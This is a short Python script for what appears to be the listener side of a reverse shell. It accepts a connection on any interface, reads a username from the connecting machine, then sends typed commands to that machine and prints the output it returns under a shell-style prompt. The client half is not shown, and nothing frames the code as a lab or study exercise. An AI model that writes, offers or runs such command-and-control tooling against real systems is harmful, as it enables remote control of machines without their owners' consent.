import socket

def main():
    # Ask for the port number to listen on
    port = int(input("Enter the port to listen on: "))
    host = '0.0.0.0'  # Listen on all network interfaces

    # Set up the server socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(1)  # Allow a single connection
    print(f"Listening for connections on port {port}...")

    while True:  # Keep the server running indefinitely
        print("Waiting for a connection...")
        conn, addr = server_socket.accept()
        print(f"Connection established from {addr}")

        # Receive and print the username from the client
        username = conn.recv(1024).decode()
        print(f"Connected to {username}")

        # Keep the connection open for communication
        while True:
            # Wait for the user to input a command
            command = input(f"{username}---$ ")

            if command.lower() == "exit":
                conn.send(command.encode())  # Send exit command to client
                break  # Break out of the command loop

            # Send the command to the client
            conn.send(command.encode())

            # Receive and print the output from the client
            output = conn.recv(4096).decode()  # Adjust buffer size if needed
            print(f"Output from {username}: {output}")

        conn.close()
        print("Connection closed.")

if __name__ == "__main__":
    main()
